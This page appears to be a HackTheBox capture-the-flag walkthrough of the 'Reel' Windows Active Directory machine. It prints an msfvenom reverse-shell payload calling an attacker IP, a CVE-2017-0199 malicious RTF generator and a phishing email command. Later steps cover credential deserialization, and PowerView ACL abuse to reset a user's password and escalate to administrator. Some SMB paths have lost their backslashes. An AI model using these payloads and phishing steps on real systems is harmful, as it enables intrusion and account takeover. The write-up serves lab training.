@@ -1,0 +1,128 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/" rel="category tag">HackTheBox</a></span>            </div>
+            <h1 class="post-title entry-title">Reel HackTheBox Walkthrough</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/reel-hackthebox-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2024-05-09T12:30:09+00:00">May 9, 2024</time><time class="updated" datetime="2025-06-19T13:23:20+00:00">June 19, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000">We consider <strong>Reel</strong> a Windows Active Directory machine and a hard box on <strong>HTB</strong>. This Reel <strong>HackTheBox</strong> Walkthrough showcases its uniqueness, featuring a phishing scenario that we rarely find in other machines. We start by enumerating the FTP service and find some files that reveal a user’s email address. Then, we send a phishing email with an attachment that grants us initial access when clicked. After gaining a foothold, we achieve privilege escalation by exploiting permissions in the Active Directory infrastructure.</span></p>
+<h3><span style="color: #800000">Table of Contents</span></h3>
+<ul>
+<li><strong><span style="color: #000000">Enumeration</span></strong></li>
+<li><strong><span style="color: #000000">Initial Access</span></strong></li>
+<li><strong><span style="color: #000000">Lateral Movement 1 (from nico to tom)</span></strong></li>
+<li><strong><span style="color: #000000">Lateral Movement 2 (from tom to claire)</span></strong></li>
+<li><strong><span style="color: #000000">Privilege Escalation (from claire to administrator)</span></strong></li>
+<li><strong><span style="color: #000000">Conclusion</span></strong></li>
+</ul>
+<h3><span style="color: #800000">Enumeration</span></h3>
+<p><span style="color: #000000">Starting the enumeration with port and service scan:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -sV -sC 10.129.228.124</pre>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjTvTJIb3wr9qXxMjOKsXFA1nV6U1lFLA1ia_GV4wjDaTD3lXwO9tZuB_csBi6k70Z9D0LKcg2kuZZAl9pXguiaVd9Ny7BpAaK6At6slSJ5At6EDfOFAMBsK0OZa27B2_hK4T3Tvwlv_7A-ivaU8YH962cB5DTqGowrTscPOjvEZimUXQknfjrDW2FVhrWi/s16000/1.png"/></span></p>
+<p><span style="color: #000000">As the default script scan suggests, there is <strong>Anonymous FTP login allowed</strong> at port 21. So, login as <strong>Anonymous :: Anonymous</strong> into <strong>FTP</strong>. After login it can be seen that there is a <strong>Documents</strong> directory which consists of 3 files namely <strong>AppLocker.docx</strong>, <strong>readme.txt</strong> and <strong>Windows Event Forwarding.docx</strong>. More information can be obtained after downloading these files locally.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">ftp 10.129.228.124
+cd documents
+ls
+get AppLocker.docx
+get readme.txt
+get "Windows Event Forwarding.docx"</pre>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhyTMTkUo045wB0LFFNbnU3iQaJ5h_NAcI-MYXPqGR5pLUVlGfPjLYQj4rjz3d6ZsTjPcJwngLoChvnS-U8NrOud1fsL2rc5VVI-FQmgYXR112nRJNXRPeHnJAjZNUFECErnAd0OYJ9L_JL3L_DMKC7L74flbiw5nrjmfyE420KQm6w-WMNgy9Fa6bAisVS/s16000/2.png"/></span></p>
+<p><span style="color: #000000">Now, reading the contents of <strong>readme.txt</strong> file.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cat readme.txt</pre>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgGDHENN2FbYkPf_cjkfCp-5DIEU8hq4tMfl7gts7pbuB1OWYfO4EqLOSHFAL0itlwliIlYEuTLDUsJ8jzsX86Td9zEY7x0BoLg2rjjsVjTMWUEge0FMsfoo7ZL48ILvE9nKKw4naNz_L4hWPwKkJOcopct8VxRhdADPPY5lBvngibrHytrcxYzZlhk7kZu/s16000/3.png"/></span></p>
+<p><span style="color: #000000">As shown above the <strong>readme.txt</strong> file contains a communication related <strong>to rtf format procedures</strong>. It seems like the document asks to email the particular format file. File “<strong>Windows Event Forwarding.docx</strong>” is a document file and in most cases, it contains the creator name which can be later used as a legitimate username to login/email.</span></p>
+<p><span style="color: #000000">To check for the <strong>Creator</strong> name the <strong>exiftool</strong> can be used here with the following command:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">exiftool "Windows Event Forwarding.docx"</pre>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEikkOHwJnGH5wiE2MkjxpmolwZyAbFTOb5EiZYSgqBNBnGMDUSEKju0WCKzOyuSMaFrTjqzniVgHrWaSlwpJgKMaHmTQOtmA_kTb2nrd3pEKYuTIRkXOeS5z2ZgBzE2kBIA2HQUG35x4A_bsIUubRD5Db8d5-QAVV_HjbX_J-I2wpBE73zgNLLbJ3_uUV_D/s16000/4.png"/></span></p>
+<h3><span style="color: #800000">Initial Access</span></h3>
+<p><span style="color: #000000">The <strong>Creator</strong> name seen is <strong>nico@megabank.com</strong>. If we remember, the <strong>readme.txt</strong> file mentioned about emailing a <strong>rtf</strong> file to the email address. We can try emailing a malicious rtf file as an attachment, such that if the user process it we should be able to get the reverse shell.</span></p>
+<p><span style="color: #000000">First, we can check if we are able to send some email to the obtained mail id or not. To do so we are using telnet to communicate and get an acknowledgement of the receipt of email.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">telnet 10.129.228.124 25</pre>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjre8-97FEmAxZH-eKnZKuYmBvtwT3LbrJa-hmCfcbaZl4tgHhDFi9FqblEselXVMUzdJAKidCiWWbYAtBzfuPp2jobNIVPe0H8INt6_xxuTHVCjvS4l7ohTKDecPOT7Xb7LrI1sZ7z-X8BdxyVWnrtujzLFLXC4IdE8wyYSsCzU8EOvskGnHk23eUtQRLm/s16000/5.png"/></span></p>
+<p><span style="color: #000000">Here, we confirm the target email address and create an.rtf file to send to the victim. We choose.rtf files because they are highly versatile and supported by a wide range of word processing software, making them popular for sharing documents across different platforms and applications. We can access and modify these plain text documents using numerous word processors, including Microsoft Word, Google Docs, and LibreOffice.</span></p>
+<h4><span style="color: #000000">Creating the Malicious RTF File</span></h4>
+<p><span style="color: #000000">There is a toolkit script which can be used here to create a <strong>.rtf</strong> file. The script can be downloaded from here (<span style="color: #0000ff"><a style="color: #0000ff" href="https://github.com/bhdresh/CVE-2017-0199.git">https://github.com/bhdresh/CVE-2017-0199.git</a></span>).</span></p>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEji7xS-DKUckyUSNYUEnd5E7OcC0U3onmoLfEA4k6dC5yhJSbAyseUyW-96u_mtwZnetiSksPSSruan-oNqU9Az-zlra50AY1NVON3bFZdSbLCavdr0Q6X-x-f1NtCuF5kbipPiM3skmL108PqD9HDS2X9F_-pnmVasctp6QXY2Sc_SkEKNVdMSK_iMT1Uz/s16000/6.png"/></span></p>
+<p><span style="color: #000000">As per the exploit usage the script requires a <strong>.hta</strong> file or <strong>.doc</strong> to be hosted at a server so that the exploit can use the .hta file to generate a .rtf file.</span></p>
+<p><span style="color: #000000">To create a .hta file, <strong>msfvenom</strong> can be used with the following command:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.117 lport=443 -f hta-psh -o file.hta</pre>
+<p><span style="color: #000000">After creating the file.hta file, a server can be started locally at port 80 to host the file.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">updog -p 80</pre>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiyEGMio-Z1Q1bm4AU2O1-EDewH85qH-NP0ZRXOnm0EHRVpFNDZtZtsDen1CL-UVJHVRpgJgo5PXvohBBb00fpR08lo0THrn0xxmDdllmH6oj2bvs_8z79i_W15rZwL32nQqQztEn3yDALTRxs6S39-caQCPqt0bvixJeawrGZ5CzYaUA8fiJbXiUbtYrSf/s16000/7.png"/></span></p>
+<p><span style="color: #000000">Now the exploit can be used with the following command to generate the .rtf file:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">python2 cve-2017-0199_toolkit.py -M gen -w raj.rtf -u http://10.10.14.117/file.hta -t RTF -x 0</pre>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgkDktbz8Ou27-rWg6Z_R3fhMHKkJaDBnW158F9K_1BkYg-NDvc0RuJbZ-tI5vKTu6NBb47SK2RgBNmA91JMMYx0WHnA5PN5LAhDjaHusrVlne5SyB_gdefi12wV6FVQGMg-tTPzqtzU93XKy78MPFqmbwbahu_aXEyzt_zCn_oL3ljrcrNgqLRzEKoWkX5/s16000/8.png"/></span></p>
+<p><span style="color: #000000">The <strong>sendEmail</strong> tool can be used inside kali linux to send an email to the target mail id i.e., <strong>nico@megabank.com</strong> and the file <strong>raj.rtf</strong> can be used as an attachment.</span></p>
+<p><span style="color: #000000">Before sending this email we need to start the <strong>netcat listener</strong> at port 443 as mentioned in our msfvenom payload.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nc -lvp 443
+sendEmail -f raj@megabank.com -t nico@megabank.com -u "Urgent Mail" -m "Join Ignite Technologies" -a raj.rtf -s 10.129.228.124 -v</pre>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjHsX0zMJ7u4tf-dWGgbbkp-6d_87YN7jsl14Zqv3ZjXPJzVkqvhCDBSoQyOfz_Ok3VNChi38U4yjxNhbAFKIwHwS6dmLgBfZXec3BQgZ-Eml0jeE5OookEe_cLPft2vcRcF4oPtGsOINtIwzwb5XJltmiT4Qycp0Mbp7eCTq6OYjm1Npiv_zMrs0n9MOCX/s16000/9.png"/></span></p>
+<p><span style="color: #000000">Once the email is sent and the victim clicks on the attachment, we receive a reverse shell connection at port 443. After the reverse shell is obtained, the user.txt flag can be found on the desktop of the nico user.</span></p>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj_CWyXKQLaLuUkIcNOyJpGlXRBCfCWqBjsuezTXe1-aeSLC5RMkj70dFl7IvGMC0nI5n9Le9XiILGtO0p6cLuKk2lTOsR5HI2nuHMjfcxsMagbdqP_LbWZWjz8DYXNF0U12QePayKslsB2iXGLhmDWPfsHpMravMWdDt9CmhxxbISoi6X9ru5_dzqKJlIa/s16000/10.png"/></span></p>
+<h3><span style="color: #800000">Lateral Movement 1 (from nico to tom)</span></h3>
+<p><span style="color: #000000">After the initial access as <strong>nico</strong> user, there is a a <strong>cred.xml</strong> file placed at the user’s desktop. Upon reading the contents of the cred.xml file it can be seen that there is a username <strong>HTBTom</strong> and a password which is in serialized format. </span></p>
+<p><span style="color: #000000">As part of the <strong data-start="409" data-end="440">Reel HackTheBox Walkthrough</strong>, to generate the deserialized password, a cmdlet can be used which is inbuilt in PowerShell, i.e., <code data-start="540" data-end="555">Import-Clixml</code>. The following command can be used to deserialize the <code data-start="610" data-end="620">cred.xml</code> file content:<br/>
+</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">powershell -c "$cred = Import-Clixml -Path cred.xml; $cred.GetNetworkCredential() | Format-List *"</pre>
+<p><span style="color: #000000">The deserialized password obtained is <strong>1ts-mag1c!!!</strong>.</span></p>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj-aJYNvLLNXOoQrPiNjsLYddAv95pUFVINQ_TgPuEjLngu1BUAkT_a4dscM6Bfd-4CYwCux4FCpQkxSKgffZKn1tMxN0nwHb_yhS3BGpfBzvlpUY2z3AReI4n_nZmIlh9DEgBjXcjVhipimX3sDT1MWml4-saIDQAT1YMZcAVLWnp2ovEmMJLEmLwISGYO/s16000/11.png"/></span></p>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhu3C94IaXJcjeSZisNPlNSm6y2KBF2mVL726ljKyKzMBSyTfz6KYkSvgIvoyCO3RUKBUeRNaiaFgUQIkY6UFs5hw0FbdYNb-_wJNf1jhVjdQWFhrSz9rdGjC4FF9ShoHWIQ3-vYGeswOPP2xfyCHphrb6iia3LLU_-sUdnRpIAhyphenhyphenyPC4mr_Zr8upQLiya_/s16000/13.png"/></span></p>
+<p><span style="color: #000000">After the password of <strong>Tom</strong> user is obtained now, we can use ssh to login as Tom user.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">ssh tom@10.129.228.124</pre>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhWOVDqEe21fmVeQ-zNz_s03PqE6LcyhdVxlP90-H02fOWQ5WHgRWGq7sfvcfxNSEDZC39qs_rWAKXKsq9m__HI6islN_jV9VTd3OawaNh8pG4HehVGR35MnpyANrHGDFTApCiYUKy-pNdfIm3QfnPp-6d0Y-A7uBhoXUhuli6kb8MSxEevjPbhlfbKdufO/s16000/14.png"/></span></p>
+<h3><span style="color: #800000">Lateral Movement 2 (from tom to claire)</span></h3>
+<p><span style="color: #000000">After logging in as the tom user, an AD Audit folder is found on the Desktop. This folder contains a directory named Bloodhound and a text file called note.txt. Upon reading the contents of note.txt, a note is found that mentions some findings. These findings state that there are no AD attack paths from a user to a Domain Admin. The note also recommends that the audit should be performed again.</span></p>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEitp0AtIPSTHYJfbZRd5bMTbAcpE_yiJ-oG7Im7n_5u4sg6Jl1CVH2UaxXCi9LZlJ_Z2zNog2ZOZAyOWIGxBQVjfSXxWiSWYuXFNARBOCpdoktMvYhWs7Iuv9lFmEBa7iVbhvFnFENU9CQVe6lCZ3pq0Y3M2_n_7Lyy-Q7xetDVPYshhSUNJeDpXNB0INKq/s16000/15.png"/></span></p>
+<p><span style="color: #000000">The <strong>Ingestors </strong>directory inside the <strong>Bloodhound</strong> folder seems to contain the old audit findings, hence it is better to run the bloodhound again inside the target system to capture the results.</span></p>
+<p><span style="color: #000000">Hence, downloading the SharpHound.ps1 script form the following link: <span style="color: #0000ff"><a style="color: #0000ff" href="https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.ps1">https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.ps1</a></span></span></p>
+<p><span style="color: #000000">To transfer the SharpHound.ps1 file from kali to target windows machine we will be using <strong>impacket-smbserver</strong> script.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">impacket-smbserver share $(pwd) -smb2support</pre>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEheZYLHadEA00tI_e5Aqj7xKeA1JvomBqCPMVeC6VX4rxHcJHEJ454C1eeGtFzdf2MyiTL8pkKyfIiEWij-SngCnprEtuqHxD4QJBwlSRoQuacKMt5Wnq6TUv8gb1ag7UW77wUdNt6spN9ofuGVPJEgTJHcXfzfRKXU5dQPvP9zVqk9lCIxfg3MR7bJRcB3/s16000/16.png"/></span></p>
+<p><span style="color: #000000">Inside the initial shell taken on target machine, run the following command to fetch the file:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">copy \10.10.14.117shareSharpHound.ps1</pre>
+<p><span style="color: #000000">After the file is copied, now running the <strong>SharpHound.ps1</strong> module.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">Import-Module .SharpHound.ps1
+Invoke-BloodHound -CollectionMethod All</pre>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg6_p19r72mHscc5qiwGscCGE9cXf-3zcogjlcbxIBiUSg3Jqiz1zfx4ihyphenhyphenkOzfvRNJJgaCCR3igGMscQNggiW47eFOlQoX5__eV0pzfFujGlobdW7K7FOW2O5nm_nEd6j8OUdncRc0D1gVCYcpDfWdGDKH0H6NIEeO2l3JbCQLS316gjtoCyT2TW0eI0_6/s16000/17.png"/></span></p>
+<p><span style="color: #000000">After the bloodhound is run, the results can be seen in the <strong>20230102182633_BloodHound.zip</strong> file.</span></p>
+<h4><span style="color: #000000">Analyzing Bloodhound Results</span></h4>
+<p><span style="color: #000000">Hence copying the zip file in the kali machine using smb service by the following command:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">copy 20230102182633_BloodHound.zip \10.10.14.117share</pre>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg5hjY3JSlizGCs-Wt_1q6G3Or8C94lBXKXIDOLAvz6wVrhaLzxG0VzezS_J3hhTCW8Zn20dATgkZR8EsU0XPBjLIKa_W676MCcBq7SpNAc_NZR3EtAM7v4y-XKqxwptul0P2QoEjfKT98xquvQ5Ulb1imteoC8oeWkQ1P95M2EgzR_N7JrVmD5JVj3hcQ7/s16000/18.png"/></span></p>
+<p><span style="color: #000000">To analyse the results visually, we will be running the Bloodhound tool. But first we will start the neo4j server by the command:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">neo4j console</pre>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhYN3dKHLaQV9V0l6o3nU55tcfrfP7714SDIrvBcrdD_HRVcXa_105wS6ltwjEs_DHnXjTl6_iD9kkCjHxkMT9BCV7pkJdvL7ZPcV11nThD56-y-oHwh2m8Tseblj4tNdaDAtl2GHmqSkvJeKhoZeigkkpOy9Glu3IRXMgAhZSyjL72do1iK_rzaqcilM37/s16000/19.png"/></span></p>
+<p><span style="color: #000000">After the neo4j service is started, we can initiate the Bloodhound tool.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">bloodhound</pre>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjLH2SXa9FD6opeqHqb2h4-dNhuqMT61UfKI2ofusyS_6jXfHXTBYO30g_qB59LHJq9pcyfAn_1GvlWsPpdziLJ989e09YFPpEFRNC8sT-TpqzUeNFpZ97f4SO3mCuOAvpVgupRfA2wIVs1ocl0ljTxZiS9kgbZ2DtVLgIW-LiRApUUS5PyAeJV97Pxooge/s16000/20.png"/></span></p>
+<p><span style="color: #000000">Login into neo4j database using the valid credentials and upload the zip file created by the SharHound.ps1 script.</span></p>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgkpCRHPyZROguI3OOlrEhBq4gjEV5YDhJCeiyRulu1fJKNUhuJM8HSackx0BcXu6-tPDmKU9T7Tt8nCj2dGWvF2y9tii-3H3d86XOX9JF26lcvE26gbQAYCvZbTo4Eh2yO8O_1uK2KAICeZfZbiYJ5lkVd1yTaP9o1C01hjCmYduUmwWrhinCRBJg5tgcE/s16000/21.png"/></span></p>
+<p><span style="color: #000000">The zip file is uploaded, and we analyze the results. Our analysis reveals that the user tom has First Degree Object Control rights with the user claire, granting tom WriteOwner permissions on claire. Furthermore, we observe that claire has WriteDACL permissions on the Backup_Admins group. We utilize PowerView.ps1 to exploit the WriteOwner permissions, enabling tom to become the owner of claire’s ACL, gain permissions on the ACL, and reset the password.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">copy \10.10.14.117sharePowerView.ps1
+Import-Module .PowerView.ps1
+Set-DomainObjectOwner -idenity claire -OwnerIdentity tom
+Add-DomainObjectAcl -TargetIdenity claire -PrincipalIdentity tom -Rights ResetPassword
+$SecPassword = ConvertTo-SecureString 'Password@1 ' -AsPlainText -Force
+Set-DomainUserPassword -identity claire -accountpassword $SecPassword</pre>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj2l9kSKxIwYTaGIx3SqJ9LpgmOdACVvWzmsj1mZZaGF1J59S9-SWdnbiTmGJ4rJWwB7_nC8_79GdLoIThAvYFwGSIBfWsQSQitvGTo0TkGk2N_MFaFqguq0UIgnk6WdnpwcX617oKxtefX7vo09C08_maURVdtfzMJf3xCYz89qiWeX94LU6jC29V1qa7c/s16000/26.png"/></span></p>
+<h3><span style="color: #800000">Privilege Escalation (from claire to administrator)</span></h3>
+<p><span style="color: #000000">Once the password of claire is reset we can login using ssh:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">ssh claire@10.129.191.71</pre>
+<p>As part of the <strong data-start="296" data-end="327">Reel HackTheBox Walkthrough</strong>, and because of the <code data-start="348" data-end="359">WriteDACL</code> permissions of claire on the <code data-start="389" data-end="404">Backup_Admins</code> group, we can now add claire as a member of the <code data-start="453" data-end="468">Backup_Admins</code> group.</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">net group "Backup_Admins " claire /add /domain</pre>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjys9kgL4XsZ5zoX63kAwOCns2mc1roTPSIvYIE20wINoKEmw8Nw3Zt0yjjTVcFZ8VfHe6aKP7MvnsUUnU9VIpiS2Vk1s2oItp13y66UwV7Y3rYLvS7F3RX5F0VjwM1SRpzuPjHyFKYIdGfVdVySUSvow0XOHEC35kaaXriqKCoqOhjPqFrjG0TQF9hvfsg/s16000/27.png"/></span></p>
+<p><span style="color: #000000">However, we are still unable to read the root.txt flag placed at the desktop of the Administrator user. There is a <strong>Backup Scripts</strong> directory on the Administrator desktop which consists of some scripts.</span></p>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiPCb7JO212tTvASTzbgvoZhnORL_k5gDu9xV6JBg7_y_n0w6HtO2-bQSD4GaeU3E74wffU0Jypsicg2Y5VmZpzVNKuGST2W7tew4y8G973Og-d2bCQYlJWFWiPmY1JjHbAa2fChB8YTnWjKZtiBofkAhdoqrRaTBLErpY4yMMqZYZk9mmYLs4JB5-_diaS/s16000/28.png"/></span></p>
+<p><span style="color: #000000">Upon checking of any of the scripts contain the password word as a string, the <strong>admin</strong> password was retrieved as <strong>Cr4ckMeIfYouC4n!</strong> in the <strong>BackupScript.ps1</strong> script.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">type * | findstr password</pre>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjsThxbuFZddPq6hvn1oWm-Yp8-aAlZR90UJAp8vTnqyzpiIyg8p8fhHWmNcSG9YOS-2Q2HgAPnnzGWX3FG4JanZHN7nFBvGxqrt9mIEhyphenhyphenv8h_a0p0AERn-QXaPTKJpJiGkCKf06JK4zz8DUhqqjIIaqNZFnlR2nPJjghHYKXN_VySPGtDq7bGlQlYftUYv/s16000/29.png"/></span></p>
+<p><span style="color: #000000">After the administrator password is retrieved, now we can login as <strong>administrator</strong> using ssh and obtain the root.txt flag.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">ssh administrator@10.129.228.224</pre>
+<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEib6K6fw4wQm8fErew_O9hsMORlEc_ftmOvFXCVYTFJbdOHPpvPlnGv7DiNuEn3MMMJNdmWURS0XbJR0lJVGI4q2YaP7OJeFnYxHngh-7x_2tRjImfv-DUt0A1rMy6fiyUQnBcrDil2WOVE51tD1r6jcIUFaJixoQHQ_gwhBPfFs8f82aVYf1W_WA3fjYsP/s16000/30.png"/></span></p>
+<h3><span style="color: #800000">Conclusion </span></h3>
+<p><span style="color: #000000"> This <strong data-start="994" data-end="1025">Reel HackTheBox Walkthrough</strong> demonstrated a realistic phishing attack vector, lateral movement through credential discovery, and Active Directory exploitation using <strong>BloodHound</strong> and <strong>PowerView</strong>. It’s a great learning experience for understanding complex privilege escalation paths in a Windows enterprise setup.</span></p>
+<p><span style="color: #000000"><strong>Author: </strong>Vinayak Chauhan is an InfoSec researcher and Security Consultant. Contact</span> <strong><a href="https://www.linkedin.com/in/vinayak--chauhan/">here</a></strong></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
